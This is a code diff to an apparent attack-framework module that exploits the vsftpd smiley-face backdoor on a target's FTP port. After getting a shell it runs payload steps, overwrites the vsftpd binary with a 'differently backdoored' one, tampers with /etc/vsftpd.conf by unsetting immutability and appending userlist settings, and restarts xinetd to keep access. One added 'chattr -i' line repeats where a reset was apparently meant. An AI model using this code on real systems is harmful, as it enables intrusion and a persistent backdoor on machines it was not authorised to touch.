@@ -26,7 +26,7 @@ class VSFTPdBackdoor(Module):
             s = remote(target['ip'], 21, timeout=0.25)
             banner = s.recvuntil("220 \r\n")
 
-            if banner[-3] == b"-" :
+            if b'%E.' in banner:
                 return None
 
             return s
@@ -38,6 +38,8 @@ class VSFTPdBackdoor(Module):
 
         # detect_val should be socket we used to test for compromise
         # Saves an open socket
+
+        payload = self.payload
 
         try:
             detect_val.sendline(b"USER anonymous:)")
@@ -54,8 +56,15 @@ class VSFTPdBackdoor(Module):
             for i in self.payload.steps():
                 s.sendline(i)
 
+            # Patch the vsftpd with a differently backdoored one
             self.drop_file(s, "vsftpd.lol",
                            "/usr/local/sbin/vsftpd")
+            s.sendline("chattr -i /etc/vsftpd.conf")
+            s.sendline("chmod +w /etc/vsftpd.conf")
+            s.sendline('printf "\\nuserlist_enable=YES\\nuserlist_file=/etc/'
+                       'ftpusers\\n" >> /etc/vsftpd.conf')
+            s.sendline("chmod -w /etc/vsftpd.conf")
+            s.sendline("chattr -i /etc/vsftpd.conf")
             s.sendline("chmod 755 /usr/local/sbin/vsftpd")
             s.sendline("service xinetd restart")
 
